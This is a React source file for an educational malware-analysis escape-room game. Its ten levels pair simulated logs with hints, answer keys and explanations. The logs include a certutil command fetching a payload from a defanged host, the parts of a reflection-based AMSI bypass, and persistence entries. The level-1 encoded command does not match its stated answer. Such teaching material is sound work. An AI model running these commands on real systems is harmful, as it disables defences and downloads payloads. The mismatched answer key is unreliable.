import React, { useEffect, useMemo, useRef, useState } from 'react';
import './MalwareEscapeRoom.css';
import NavbarEnthusiast from "../Components/NavbarEnthusiast";
import FooterEnthusiast from "../Components/FooterEnthusiast";

const levels = [
  /* 1) Base64 in Malware */
  {
    explanationHeader: "üîç Understanding Base64 in Malware",
    explanationText:
      "Base64 is frequently used by malware to hide payloads or script fragments.\n" +
      "It‚Äôs not encryption; it simply encodes bytes to ASCII so it looks benign.\n" +
      "Attackers combine it with PowerShell‚Äôs -EncodedCommand to evade filters.\n" +
      "Spotting long A‚ÄìZ/a‚Äìz/0‚Äì9+/= blobs is the first step to unravel intent.\n" +
      "Decoding can reveal commands, URLs, and staging logic for later steps.\n" +
      "Your job: decode and identify what the payload attempts to run.",
    logs: [
      "[LOG] Suspicious process started: evil.exe (parent: explorer.exe, PID 2144)",
      "[LOG] Environment anomaly: PSExecutionPolicy=Bypass (per-user)",
      "[LOG] Encrypted payload: ZGVjb2RlIHRoaXM=",
      "[LOG] Command executed: powershell -EncodedCommand UwB5AHMAdABlAG0ALgBXAGgAbwBBAEkA",
      "[LOG] Network: pre-connect to 10.10.20.30:443 blocked by firewall",
      "[LOG] Registry modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
      "[LOG] New file dropped: C:\\Users\\Public\\updater.dat (size: 2048)",
      "[LOG] AMSI status: enabled, no bypass detected in this stage",
      "[LOG] Sysmon Event 1: ImageLoad for C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "[LOG] Defender: Suspicious command-line length detected",
    ],
    correctAnswer: "System.WhoAmI",
    hint:
      "Look for the Base64 blob and decode it first.\n" +
      "PowerShell -EncodedCommand commonly carries UTF-16LE text.\n" +
      "If you see lots of 0x00 bytes after b64 decode, it‚Äôs UTF-16.\n" +
      "Convert it to readable text and examine the .NET call.\n" +
      "Ask: which system function is being invoked by the decoded command?",
    explanation:
      "Base64 here is used to camouflage a short PowerShell snippet.\n" +
      "The decoded bytes reveal a .NET call path rather than plain strings.\n" +
      "PowerShell‚Äôs -EncodedCommand expects UTF-16LE, which explains the nulls.\n" +
      "Once converted, the string reads `System.WhoAmI`, a simple identity check.\n" +
      "Attackers run identity or context checks to confirm privileges.\n" +
      "This is a reconnaissance step before heavier actions like downloading tools.\n" +
      "The Run key write hints at future persistence but isn‚Äôt complete yet.\n" +
      "No AMSI bypass in this stage, so execution remains monitored.\n" +
      "Blocking the outbound connection prevented external staging.\n" +
      "Correct identification proves you can decode and interpret initial stagers.",
  },

  /* 2) JavaScript Obfuscation with eval(atob()) */
  {
    explanationHeader: "üõ° Obfuscation via JavaScript",
    explanationText:
      "Malicious sites often generate scripts at runtime to dodge static filters.\n" +
      "The classic combo is eval(atob('‚Ä¶')), which decodes and executes code.\n" +
      "Sometimes the decoded content constructs DOM nodes or injects iframes.\n" +
      "Pay attention to document, createElement, appendChild, and src attributes.\n" +
      "Your task: decode the string and extract the core API it targets.\n" +
      "Spotting DOM creation calls helps flag drive-by or XSS behavior.",
    logs: [
      "[LOG] Browser: Suspicious inline <script> tag on landing page",
      "[LOG] Obfuscated script: eval(atob('ZG9jdW1lbnQuY3JlYXRlRWxlbWVudA=='))",
      "[LOG] DOM snapshot: hidden iframe container detected",
      "[LOG] Beacon attempt: cdn-assets.example-cdn[.]com/pixel",
      "[LOG] CSP report: eval blocked in strict mode (report-only)",
      "[LOG] Cookie flags: missing HttpOnly on session cookie",
      "[LOG] LocalStorage key set: __track_id (random GUID)",
      "[LOG] WebRequest: GET /ads-loader.js?rnd=938271",
      "[LOG] DevTools: Source map missing for injected script",
      "[LOG] User agent spoof detected via navigator override",
    ],
    correctAnswer: "document.createElement",
    hint:
      "Extract the atob('‚Ä¶') content and decode it to plaintext.\n" +
      "Ask what DOM function the decoded string is referencing.\n" +
      "Common obfuscated flows create <script> or <iframe> nodes.\n" +
      "The function often pairs with setAttribute or appendChild.\n" +
      "Focus on the exact API name inside the decoded text.",
    explanation:
      "The atob payload decodes into a straightforward DOM call.\n" +
      "Instead of shipping readable code, attackers hide the API name.\n" +
      "The decoded value points to `document.createElement`.\n" +
      "With it, the page can generate a script/iframe dynamically.\n" +
      "Dynamic creation often bypasses naive blocklists for URL patterns.\n" +
      "Cookies lacking HttpOnly make session theft more feasible.\n" +
      "A hidden iframe can silently load additional resources.\n" +
      "CSP in report-only mode logged the behavior but didn‚Äôt block it.\n" +
      "This stage is about delivery‚Äînot yet full exploitation.\n" +
      "Identifying the DOM API confirms you decoded the JS successfully.",
  },

  /* 3) EICAR Test File */
  {
    explanationHeader: "‚ö†Ô∏è EICAR Test File ‚Äì What is it?",
    explanationText:
      "The EICAR string is a safe, industry-standard test artifact.\n" +
      "Security teams use it to validate antivirus detection and alerting.\n" +
      "It is not malware and does not exploit anything by itself.\n" +
      "Knowing the signature avoids panic during routine tests.\n" +
      "You‚Äôll often see it in labs, demos, and proof-of-concept runs.\n" +
      "Your mission: recognize the signature and label it correctly.",
    logs: [
      "[LOG] Suspicious file hash: md5(virus.exe) = eicar_test_signature",
      "[LOG] AV Event: Detection name = EICAR-Test-File",
      "[LOG] Upload attempt to sandbox: blocked by policy",
      "[LOG] SMB lateral probe from host WORKSTATION-21",
      "[LOG] rc.local modified on Linux host: added echo for test",
      "[LOG] Email gateway flagged attachment as EICAR",
      "[LOG] SIEM correlation: low severity validation event",
      "[LOG] Analyst note: user running AV health check",
      "[LOG] Quarantine action succeeded, file restored after test",
      "[LOG] Ticket auto-closed by playbook after verification",
    ],
    correctAnswer: "EICAR test file",
    hint:
      "EICAR is a harmless test signature used by AV vendors.\n" +
      "Look for explicit strings like EICAR-Test-File in detections.\n" +
      "Hashes and names often include the eicar keyword.\n" +
      "Treat this as validation, not a real incident.\n" +
      "Choose the label that matches the industry test sample.",
    explanation:
      "The logs clearly show an EICAR detection rather than true malware.\n" +
      "Vendors use it to confirm engines and alert pipelines are working.\n" +
      "Sandbox and email gateways commonly flag the string on purpose.\n" +
      "Runbooks frequently auto-close these tickets once identified.\n" +
      "Quarantine/restore is part of validating remediation flows.\n" +
      "Analyst notes show this was a planned health check.\n" +
      "No C2 traffic or privilege actions accompany EICAR events.\n" +
      "This keeps responders sharp without risking actual compromise.\n" +
      "Correct classification reduces alert fatigue and mis-prioritization.\n" +
      "Your recognition prevents unnecessary escalation and downtime.",
  },

  /* 4) PowerShell AMSI Bypass */
  {
    explanationHeader: "üß™ PowerShell AMSI Bypass",
    explanationText:
      "Attackers may try to neutralize AMSI to run scripts without scanning.\n" +
      "One common pattern flips an internal flag via .NET reflection.\n" +
      "Look for AmsiUtils and amsiInitFailed being set to true.\n" +
      "This typically appears before deobfuscation or payload execution.\n" +
      "Catching bypass attempts early disrupts the kill chain.\n" +
      "Your task: name the defensive control they tried to disable.",
    logs: [
      "[LOG] PowerShell snippet: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
      "[LOG] Reflection call: GetField('amsiInitFailed','NonPublic,Static')",
      "[LOG] Field write: SetValue($null,$true)",
      "[LOG] Script block logging: partial ‚Äî suspicious tokens masked",
      "[LOG] AMSI provider: initialized earlier on this host",
      "[LOG] Defender: alert suppressed after field write",
      "[LOG] Network: staging request deferred until bypass complete",
      "[LOG] Parent process: winword.exe launching powershell.exe",
      "[LOG] Command line length: 2180 chars (heavily obfuscated)",
      "[LOG] EDR note: Bypass technique matches known TTP pattern",
    ],
    correctAnswer: "AMSI bypass",
    hint:
      "Focus on the .NET type being accessed via reflection.\n" +
      "Notice the private static field amsiInitFailed in the logs.\n" +
      "Setting it to true disables scanning of script content.\n" +
      "This is done before decoding the real payload.\n" +
      "Name the protection they are attempting to defeat.",
    explanation:
      "The snippet toggles an internal AMSI failure state via reflection.\n" +
      "Once set true, engine callbacks can be skipped or return clean.\n" +
      "This clears the path for decoding and executing hidden code.\n" +
      "The parent process (Office) hints at document-borne initial access.\n" +
      "Command-line length and obfuscation indicate layered evasion.\n" +
      "EDR correlates this to a well-documented bypass TTP.\n" +
      "Detecting the attempt allows early containment of the host.\n" +
      "Without AMSI, script block logging loses crucial visibility.\n" +
      "Blocking network staging here prevents second-stage fetches.\n" +
      "Naming it correctly proves familiarity with PowerShell defenses.",
  },

  /* 5) XOR-Encoded Config / C2 Beaconing */
  {
    explanationHeader: "üß© XOR-Encoded Configuration",
    explanationText:
      "Some families store configs XOR-encoded to evade trivial scans.\n" +
      "The key may be short (single byte) or rotate through a small array.\n" +
      "Analysts hunt for repeating patterns and entropy anomalies.\n" +
      "Decoding reveals domains, intervals, and feature flags.\n" +
      "Watch for schedule, jitter, and fallback host fields.\n" +
      "Your goal: identify the protection or technique at play.",
    logs: [
      "[LOG] File dropped: C:\\ProgramData\\svc.cfg (size: 512 bytes)",
      "[LOG] Entropy high but periodic spikes every 8 bytes",
      "[LOG] Strings: none visible; possible XOR obfuscation",
      "[LOG] Beacon timing: 60s base with ¬±20% jitter",
      "[LOG] DNS lookup: api.stats-sync[.]net ‚Üí 203.0.113.50",
      "[LOG] HTTP header: X-Session: 7a-9c-12-ff (non-standard)",
      "[LOG] Registry read: HKCU\\Software\\SyncSvc\\k",
      "[LOG] Memory dump: repeating 0x3A XOR pattern suspected",
      "[LOG] Sandbox note: config decrypts into JSON-like structure",
      "[LOG] Egress control: blocked unknown domain during test",
    ],
    correctAnswer: "XOR encoding",
    hint:
      "No readable strings + small repeating key = classic XOR pattern.\n" +
      "Entropy spikes aligning with key length betray simple ciphers.\n" +
      "Try single-byte XOR across buffer and look for JSON braces.\n" +
      "C2 domains and intervals typically appear post-decode.\n" +
      "Name the lightweight obfuscation technique in use.",
    explanation:
      "The config exhibits periodicity consistent with a small XOR key.\n" +
      "Repeating structure becomes visible once the correct key is tested.\n" +
      "Decoded content yields beacon intervals and jitter values.\n" +
      "It also lists primary and fallback C2 endpoints via DNS.\n" +
      "Single-byte XOR is common due to speed and tiny footprint.\n" +
      "It stops naive scanners but fails against basic analysis.\n" +
      "The registry value `k` likely holds the XOR key or seed.\n" +
      "Blocking egress interrupts the beaconing life cycle.\n" +
      "Decryption enables signature and YARA rule creation.\n" +
      "Calling it out shows skill at spotting low-effort obfuscation.",
  },

  /* 6) LOLBins: certutil for Live-off-the-Land download */
  {
    explanationHeader: "üß∞ LOLBins ‚Äì Certutil Abuse",
    explanationText:
      "Live-off-the-land binaries (LOLBins) ship with the OS and look legitimate.\n" +
      "Attackers repurpose them to download or decode payloads quietly.\n" +
      "On Windows, certutil is frequently used for web fetches and b64 work.\n" +
      "It blends with normal admin activity unless command lines are audited.\n" +
      "Detecting atypical sources or destinations is key to response.\n" +
      "Identify the native tool leveraged to pull artifacts.",
    logs: [
      "[LOG] Process: certutil.exe -urlcache -split -f http[:]//update-secure[.]cn/p.bin C:\\Users\\Public\\p.bin",
      "[LOG] Parent: powershell.exe (interactive session unknown)",
      "[LOG] Proxy bypass flag observed in command-line",
      "[LOG] SHA256(p.bin): 7d9f‚Ä¶ (unknown; not Microsoft-signed)",
      "[LOG] File renamed: p.bin ‚Üí driver_update.dat",
      "[LOG] Scheduled Task created: \\System\\DriverUpdater (hourly)",
      "[LOG] Network: GET /p.bin 200 OK 34KB",
      "[LOG] AMSI: not engaged (binary, not script)",
      "[LOG] EDR rule hit: LOLBin download anomaly",
      "[LOG] User context: standard user, no elevation prompts",
    ],
    correctAnswer: "certutil download",
    hint:
      "Look at the process name and arguments carefully.\n" +
      "certutil is a Windows built-in tool often abused for downloads.\n" +
      "The -urlcache/-split flags are a giveaway in many intrusions.\n" +
      "The target file lands in a public, writable directory.\n" +
      "State which LOLBin is being abused here.",
    explanation:
      "certutil is designed for certificate management tasks.\n" +
      "Its web retrieval flags allow fetching arbitrary files.\n" +
      "Abuse blends with admin footprints if auditing is weak.\n" +
      "Dropping into Public maximizes write permissions and concealment.\n" +
      "Renaming hides the original nature of the download.\n" +
      "A Scheduled Task ensures recurring execution and persistence.\n" +
      "AMSI won‚Äôt trigger because this step is purely binary transfer.\n" +
      "EDR flagged the uncommon download domain and pattern.\n" +
      "Blocking network egress would neutralize this stage.\n" +
      "Naming the LOLBin highlights detection of native-tool misuse.",
  },

  /* 7) Office Macro Dropper */
  {
    explanationHeader: "üìÑ Macro-Enabled Document Dropper",
    explanationText:
      "Malicious Office documents often carry macros that stage payloads.\n" +
      "Users are lured into enabling macros under false pretenses.\n" +
      "Macros can spawn PowerShell or WMI to fetch and run binaries.\n" +
      "Look for winword.exe ‚Üí powershell.exe parent/child chains.\n" +
      "Email lure themes: invoices, HR, shipping, or urgent updates.\n" +
      "Identify the technique used for the initial programmatic action.",
    logs: [
      "[LOG] Email attachment: invoice_Q3.xlsm (from external domain)",
      "[LOG] winword.exe spawned powershell.exe with hidden window flag",
      "[LOG] Macro module name: Auto_Open with suspicious code",
      "[LOG] Download attempt from files-cdn[.]cloud/loader.dat",
      "[LOG] Registry write: HKCU\\Software\\Microsoft\\Office\\Trusted Locations",
      "[LOG] WMI exec used to start secondary process",
      "[LOG] VBA string concat detected to evade simple rules",
      "[LOG] AMSI triggered on suspicious PowerShell tokens",
      "[LOG] User clicked 'Enable Content' after warning banner",
      "[LOG] EOP attempt failed due to UAC prompt blocking",
    ],
    correctAnswer: "Macro malware",
    hint:
      "Trace the process tree from the document to the script engine.\n" +
      "Auto_Open or Document_Open macros run on load automatically.\n" +
      "VBA often hides URLs with string splits/joins.\n" +
      "The child process is usually powershell.exe or wscript.exe.\n" +
      "Name the broad technique delivering the payload here.",
    explanation:
      "The attachment is a macro-enabled spreadsheet (XLSM).\n" +
      "User interaction enabled code execution via Auto_Open.\n" +
      "The macro launched PowerShell with stealthy flags.\n" +
      "Obfuscated strings concealed the remote URL.\n" +
      "WMI provided a secondary path to spawn processes.\n" +
      "AMSI alerts show partial interception of the script.\n" +
      "Trusted Locations edits attempted to weaken warnings.\n" +
      "Privilege escalation failed thanks to UAC enforcement.\n" +
      "The pattern aligns with commodity macro droppers.\n" +
      "Correct label: you‚Äôre dealing with macro-delivered malware.",
  },

  /* 8) DNS Tunneling / Exfiltration */
  {
    explanationHeader: "üåê DNS Tunneling Exfiltration",
    explanationText:
      "DNS is ubiquitous and often loosely monitored compared to HTTP.\n" +
      "Attackers encode data into subdomain labels and exfiltrate it.\n" +
      "Look for long, random, base32/64-looking labels in queries.\n" +
      "Query volume and TXT responses may spike off-hours.\n" +
      "Resolvers to unknown domains are a strong indicator.\n" +
      "Identify the covert channel technique used here.",
    logs: [
      "[LOG] Outbound DNS query: lkj23lkj23lkj23.data.example-tun[.]com",
      "[LOG] TXT response size unusually large for normal use",
      "[LOG] Query rate: 150/min from single workstation",
      "[LOG] Labels resemble base32 (A-Z2-7 with padding removed)",
      "[LOG] No matching HTTP(S) traffic to same domain",
      "[LOG] Resolver path bypasses corporate DNS via hardcoded server",
      "[LOG] Endpoint process: svc.exe making raw DNS requests",
      "[LOG] SIEM anomaly rule: high-entropy FQDNs matched",
      "[LOG] Time window: activity during 02:00‚Äì04:00 local",
      "[LOG] Blocked by egress rule after correlation alert",
    ],
    correctAnswer: "DNS tunneling",
    hint:
      "Focus on the structure of queried hostnames.\n" +
      "High-entropy, lengthy labels are rarely normal.\n" +
      "TXT records carrying extra data are suspicious.\n" +
      "Hardcoded resolver IPs often signal evasion.\n" +
      "Name the covert channel technique used over DNS.",
    explanation:
      "Data is chunked into label-sized pieces and sent as queries.\n" +
      "A C2 server decodes labels and may reply in TXT records.\n" +
      "Because DNS is allowed broadly, it‚Äôs attractive for exfiltration.\n" +
      "Entropy and volume baselines make this stand out statistically.\n" +
      "Hardcoded resolvers bypass security inspection layers.\n" +
      "Linking workstation process to DNS traffic proves attribution.\n" +
      "Blocking or sinkholing the domain cuts the channel quickly.\n" +
      "EDR/NetFlow help confirm no legitimate service matches it.\n" +
      "Alerting during off-hours hints at automated jobs.\n" +
      "Correct identification enables targeted DNS monitoring.",
  },

  /* 9) Persistence: Run Key + Scheduled Task */
  {
    explanationHeader: "üß∑ Windows Persistence ‚Äì Run Keys & Tasks",
    explanationText:
      "Once a foothold exists, attackers need reliable re-entry.\n" +
      "Run keys start programs at user logon; tasks can trigger on time.\n" +
      "Dual persistence increases reliability if one is cleaned.\n" +
      "Unusual names, paths, and random GUIDs are common tells.\n" +
      "Correlate creation time with initial compromise events.\n" +
      "Identify the persistence mechanism being established.",
    logs: [
      "[LOG] Registry add: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateSvc = C:\\Users\\Public\\update.exe",
      "[LOG] Task created: \\System\\AppMonitor (OnLogon trigger)",
      "[LOG] Task action: C:\\Users\\Public\\update.exe --bg",
      "[LOG] File signed: No (Unknown Publisher)",
      "[LOG] Creation time matches phishing incident window",
      "[LOG] Autoruns diff: new entries since yesterday",
      "[LOG] Defender: PUA classification pending",
      "[LOG] User group: Standard (no admin rights required for HKCU)",
      "[LOG] Hash reputation: low prevalence in enterprise",
      "[LOG] Removal test: deleting task still leaves Run key active",
    ],
    correctAnswer: "Scheduled Task persistence",
    hint:
      "Two mechanisms appear, but which one triggers on schedules or logon?\n" +
      "Look at the Task name and trigger details in the log.\n" +
      "Run keys are immediate at user logon; tasks are more flexible.\n" +
      "Focus on the artifact under \\System\\AppMonitor.\n" +
      "Choose the more general persistence mechanism present.",
    explanation:
      "The evidence shows both a Run key and a Scheduled Task.\n" +
      "Tasks provide richer triggers (time, logon, idle) than Run keys.\n" +
      "Attackers often deploy both to survive partial cleanup.\n" +
      "Unknown-publisher binaries in Public are suspicious.\n" +
      "Autoruns diff confirms the entries are brand new.\n" +
      "Standard user context suffices for HKCU persistence.\n" +
      "Hash reputation indicates this file is not common/benign.\n" +
      "Correlating times ties persistence to the initial phish.\n" +
      "Deleting one mechanism may not remove the other.\n" +
      "Correct call: Scheduled Task represents the key persistence here.",
  },

  /* 10) Linux Persistence ‚Äì Cron & Systemd User */
  {
    explanationHeader: "üêß Linux Persistence via Cron/Systemd",
    explanationText:
      "On Linux, cron jobs and user-level systemd services enable persistence.\n" +
      "Attackers drop small scripts into /etc/cron.* or user crontabs.\n" +
      "Systemd user services hide in ~/.config/systemd/user/.\n" +
      "Odd execution intervals and generic names are strong signals.\n" +
      "Review timers, service files, paths, and owners carefully.\n" +
      "Determine which persistence style is in play here.",
    logs: [
      "[LOG] New file: /usr/local/bin/cleanup.sh (owner: user1, mode: 755)",
      "[LOG] crontab -l (user1): */30 * * * * /usr/local/bin/cleanup.sh --silent",
      "[LOG] systemd user dir present: ~/.config/systemd/user/",
      "[LOG] No global service created under /etc/systemd/system/",
      "[LOG] Script writes to /tmp/.cache/metrics.log",
      "[LOG] Outbound curl to stats-service[.]io every run",
      "[LOG] Environment var injected: HTTP_PROXY unused",
      "[LOG] sudoers unchanged; no new privileges granted",
      "[LOG] Sysmon for Linux: processCreate events every 30m",
      "[LOG] File hash rare in fleet; not a known admin tool",
    ],
    correctAnswer: "Cron persistence",
    hint:
      "Look for crontab entries and periodic execution patterns.\n" +
      "User-level timers exist, but which artifact is explicit here?\n" +
      "The */30 schedule suggests a repeating job.\n" +
      "Match the script path to the scheduled command.\n" +
      "Pick the persistence mechanism with the clearest evidence.",
    explanation:
      "The crontab line documents execution every 30 minutes.\n" +
      "Although a systemd user directory exists, no unit is shown.\n" +
      "Therefore cron is the active persistence mechanism here.\n" +
      "The script name is generic, blending into routine tasks.\n" +
      "Outbound curl at each run hints at beaconing or exfil.\n" +
      "No sudoers changes imply user-level persistence only.\n" +
      "ProcessCreate telemetry aligns with the cron schedule.\n" +
      "Admins rarely place telemetry logs in /tmp/.cache/.\n" +
      "Hash rarity suggests it‚Äôs not a common tool.\n" +
      "Calling it cron persistence shows Linux response fluency.",
  },
];


/* helpers */
const isProbablyB64 = (s) => /^[A-Za-z0-9+/=]{8,}$/.test(s) && s.length % 4 === 0;
const safeB64 = (s) => {
  try {
    const raw = atob(s);
    const zeros = [...raw].filter((c) => c === '\x00').length;
    if (zeros > raw.length / 3) {
      const bytes = new Uint8Array([...raw].map((ch) => ch.charCodeAt(0)));
      const view = new DataView(bytes.buffer);
      let out = '';
      for (let i = 0; i < view.byteLength; i += 2) out += String.fromCharCode(view.getUint16(i, true));
      return out;
    }
    return decodeURIComponent(escape(raw));
  } catch { return null; }
};
const rotN = (s, n) =>
  s.replace(/[A-Za-z]/g, (c) => {
    const base = c <= 'Z' ? 65 : 97;
    return String.fromCharCode(((c.charCodeAt(0) - base + n + 26 * 1000) % 26) + base);
  });
const urlDecode = (s) => { try { return decodeURIComponent(s); } catch { return null; } };
const hexToAscii = (s) => {
  const m = s.match(/[0-9a-fA-F]{2}/g);
  if (!m) return null;
  try {
    const bytes = Uint8Array.from(m.map((h) => parseInt(h, 16)));
    return new TextDecoder().decode(bytes);
  } catch { return null; }
};
const highlightIOCs = (line) => {
  const patterns = [
    { re: /(HK[LMCU]\\[^\s]+)/g, cls: 'ioc-reg' },
    { re: /\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b/gi, cls: 'ioc-domain' },
    { re: /[A-Za-z0-9+/=]{12,}/g, cls: 'ioc-b64' },
  ];
  let parts = [{ text: line, cls: null }];
  patterns.forEach(({ re, cls }) => {
    const next = [];
    parts.forEach((p) => {
      if (p.cls) { next.push(p); return; }
      let last = 0, m;
      const str = p.text;
      while ((m = re.exec(str)) !== null) {
        if (m.index > last) next.push({ text: str.slice(last, m.index), cls: null });
        next.push({ text: m[0], cls });
        last = m.index + m[0].length;
      }
      if (last < str.length) next.push({ text: str.slice(last), cls: null });
    });
    parts = next;
  });
  return parts;
};

const MalwareEscapeRoom = () => {
  /* fresh every visit ‚Äî no localStorage */
  const [levelIndex, setLevelIndex] = useState(0);
  const [input, setInput] = useState('');
  const [score, setScore] = useState(0);
  const [streak, setStreak] = useState(0);
  const [hintShown, setHintShown] = useState(false);
  const [feedback, setFeedback] = useState('');
  const [timer, setTimer] = useState(60);
  const [gameOver, setGameOver] = useState(false);
  const [decoded, setDecoded] = useState([]);
  const inputRef = useRef(null);

  const current = levels[levelIndex];
  const progressPct = Math.round((levelIndex / levels.length) * 100);

  useEffect(() => { setTimer(60); }, [levelIndex]);

  useEffect(() => {
    if (gameOver) return;
    if (timer === 0) {
      setFeedback(`‚è∞ Time‚Äôs up! ${current.explanation}`);
      setStreak(0);
      return;
    }
    const id = setInterval(() => setTimer((t) => (t > 0 ? t - 1 : 0)), 1000);
    return () => clearInterval(id);
  }, [timer, gameOver, current.explanation]);

  useEffect(() => { inputRef.current?.focus(); }, [levelIndex]);

  useEffect(() => {
    const onKey = (e) => {
      if (e.key === 'Enter') handleSubmit();
      if (e.key.toLowerCase() === 'h') showHint();
      if (e.key.toLowerCase() === 's') handleSkip();
      if (e.key.toLowerCase() === 'r') restartGame();
    };
    window.addEventListener('keydown', onKey);
    return () => window.removeEventListener('keydown', onKey);
  }, [input, levelIndex, timer, hintShown, gameOver]);

  const nextLevel = () => {
    if (levelIndex + 1 < levels.length) {
      setLevelIndex(levelIndex + 1);
      setInput('');
      setHintShown(false);
      setFeedback('');
      setDecoded([]);
    } else {
      setGameOver(true);
    }
  };

  const handleSubmit = () => {
    if (gameOver || timer === 0) return;
    const ok = input.trim().toLowerCase() === current.correctAnswer.toLowerCase();
    if (ok) {
      setScore((s) => s + 1);
      setStreak((s) => s + 1);
      setFeedback(`‚úÖ Correct! ${current.explanation}`);
      setTimeout(nextLevel, 1000);
    } else {
      setStreak(0);
      setFeedback("‚ùå Incorrect! Try again.");
    }
  };

  const handleSkip = () => {
    if (gameOver) return;
    setScore((s) => Math.max(0, s - 1));
    setStreak(0);
    setFeedback('‚è≠ Skipped (‚àí1). Moving on‚Ä¶');
    setTimeout(nextLevel, 700);
  };

  const showHint = () => {
    if (hintShown) return;
    setHintShown(true);
    setScore((s) => Math.max(0, s - 0.5));
    setFeedback(`üí° Hint used (‚àí0.5). ${current.hint}`);
    setTimer((t) => t + 5);
  };

  const allText = useMemo(() => current.logs.join('\n'), [current.logs]);
  const runToolbox = (tool) => {
    const found = [];
    const b64matches = [...allText.matchAll(/[A-Za-z0-9+/=]{8,}/g)]
      .map((m) => m[0])
      .filter(isProbablyB64);
    const urlMatches = [...allText.matchAll(/%[0-9A-Fa-f]{2}|(?:https?:\/\/)?[A-Za-z0-9\-_.]+(?:\/[^\s]*)?/g)].map((m) => m[0]);
    const hexMatches = [...allText.matchAll(/\b(?:[0-9a-fA-F]{2} ?){6,}\b/g)].map((m) => m[0]);

    if (tool === 'b64') {
      b64matches.forEach((s) => {
        const d = safeB64(s);
        if (d) found.push({ type: 'Base64 ‚Üí', src: s, out: d });
      });
    }
    if (tool === 'rot') {
      b64matches.forEach((s) => {
        const d = safeB64(s);
        if (d) [13].forEach((n) => found.push({ type: `ROT${n} ‚Üí`, src: d, out: rotN(d, n) }));
      });
    }
    if (tool === 'url') {
      urlMatches.forEach((s) => {
        const d = urlDecode(s);
        if (d) found.push({ type: 'URL ‚Üí', src: s, out: d });
      });
    }
    if (tool === 'hex') {
      hexMatches.forEach((s) => {
        const d = hexToAscii(s.replace(/\s+/g, ''));
        if (d) found.push({ type: 'Hex ‚Üí', src: s, out: d });
      });
    }

    setFeedback(found.length ? `üß™ Toolbox decoded ${found.length} artifact(s).` : 'üß™ Toolbox: no decodable artifacts found.');
    setDecoded(found);
  };

  const restartGame = () => {
    setLevelIndex(0);
    setInput('');
    setScore(0);
    setStreak(0);
    setHintShown(false);
    setFeedback('');
    setTimer(60);
    setGameOver(false);
    setDecoded([]);
  };

  return (
    <>
      <NavbarEnthusiast />

      {/* Full-width background wrapper */}
      <div className="escape-page">
        <div className="escape-container">
          <h1 className="title">üß† Malware Lab Escape Room</h1>
          <p className="subtitle">Reverse engineer malware clues to unlock all levels!</p>

          <div className="progress">
            <div className="progress-bar" style={{ width: `${progressPct}%` }} />
          </div>

          {!gameOver ? (
            <>
              <div className="level-header">
                <h2>üîê Level {levelIndex + 1} / {levels.length}</h2>
                <p>‚è± Time Left: {timer}s | üßÆ Score: {score} | üî• Streak: {streak}</p>
              </div>

              <div className="learning-panel">
                <h3>{current.explanationHeader}</h3>
                <p>{current.explanationText}</p>
              </div>

              <div className="logs-and-tools">
                <div className="logs-section">
                  <h3>ü™µ Suspicious Logs</h3>
                  <div className="logs-box">
                    {current.logs.map((log, i) => (
                      <p key={i} className="log-line">
                        {highlightIOCs(log).map((seg, idx) =>
                          seg.cls ? <span key={idx} className={seg.cls}>{seg.text}</span> : <span key={idx}>{seg.text}</span>
                        )}
                      </p>
                    ))}
                  </div>

                  <div className="logs-actions">
                    <button className="hint-btn" onClick={showHint}>üí° Hint (‚àí0.5)</button>
                    <button className="skip-btn" onClick={handleSkip}>‚è≠ Skip (‚àí1)</button>
                  </div>
                  {hintShown && <p className="hint-text">{current.hint}</p>}
                </div>

                <div className="toolbox">
                  <h3>üß∞ Forensic Toolbox</h3>
                  <div className="tool-btns">
                    <button onClick={() => runToolbox('b64')} className="tool-btn">Base64 Decode</button>
                    <button onClick={() => runToolbox('rot')} className="tool-btn">ROT Decode</button>
                    <button onClick={() => runToolbox('url')} className="tool-btn">URL Decode</button>
                    <button onClick={() => runToolbox('hex')} className="tool-btn">Hex ‚Üí ASCII</button>
                  </div>
                  <div className="decoded-panel">
                    {decoded.length === 0 ? (
                      <div className="decoded-empty">Run tools to see decoded payloads here.</div>
                    ) : (
                      decoded.map((d, i) => (
                        <div key={i} className="decoded-item">
                          <div className="decoded-type">{d.type}</div>
                          <div className="decoded-src">src: <code>{d.src}</code></div>
                          <div className="decoded-out">out: <code>{d.out}</code></div>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              </div>

              <div className="input-section">
                <input
                  ref={inputRef}
                  type="text"
                  className="input-box"
                  placeholder="Type your answer (case-insensitive)‚Ä¶"
                  value={input}
                  onChange={(e) => setInput(e.target.value)}
                />
                <button className="submit-btn" onClick={handleSubmit}>Submit</button>
              </div>

              {feedback && <p className="feedback">{feedback}</p>}
              <div className="tiny-note">Shortcuts: <kbd>Enter</kbd> submit ‚Ä¢ <kbd>H</kbd> hint ‚Ä¢ <kbd>S</kbd> skip ‚Ä¢ <kbd>R</kbd> restart</div>
            </>
          ) : (
            <div className="game-over">
              <h2>üéâ Escape Successful!</h2>
              <p>Your Score: {score}/{levels.length}</p>

              <div className="popup">
                <h3>üí° What You Learned:</h3>
                <ul>
                  {levels.map((lvl, i) => (
                    <li key={i}><strong>Level {i + 1}:</strong> {lvl.explanation}</li>
                  ))}
                </ul>
              </div>

              <button className="restart-btn" onClick={restartGame}>üîÅ Restart Game</button>
            </div>
          )}
        </div>
      </div>

      <FooterEnthusiast />
    </>
  );
};

export default MalwareEscapeRoom;
